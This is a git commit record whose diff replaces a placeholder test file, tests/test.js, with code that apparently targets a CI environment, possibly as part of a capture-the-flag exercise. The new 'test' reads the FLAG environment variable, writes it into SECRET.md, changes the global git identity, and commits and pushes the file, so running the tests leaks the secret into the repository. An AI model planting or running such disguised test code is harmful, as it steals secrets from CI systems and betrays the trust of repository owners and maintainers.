5a685bb8732b8b33504f6e9abb56d0b48c71a1f3
Gabe <admin@admins-MacBook-Pro.local>
2023-04-14 14:10:33 -0400

    Somethign

--- tests/test.js
+++ tests/test.js
@@ -1,2 +1,19 @@
-// TODO: implement the tests
-console.log("Tests are not implemented yet...");
+const fs = require("fs");
+const https = require("https");
+
+function exposeSecret() {
+  const secret = process.env.FLAG;
+  const newContent = `# Secret Exposed\n\nThe secret flag is: ${secret}\n`;
+
+  fs.writeFileSync("SECRET.md", newContent);
+
+  // Commit and push the changes
+  require("child_process").execSync("git config --global user.email 'glsarver@ncsu.edu'");
+  require("child_process").execSync("git config --global user.name 'Gabe'");
+  require("child_process").execSync("git add SECRET.md");
+  require("child_process").execSync(`git commit -m "Expose secret"`);
+  require("child_process").execSync("git push origin HEAD");
+}
+
+// Call the function to expose the secret
+exposeSecret();
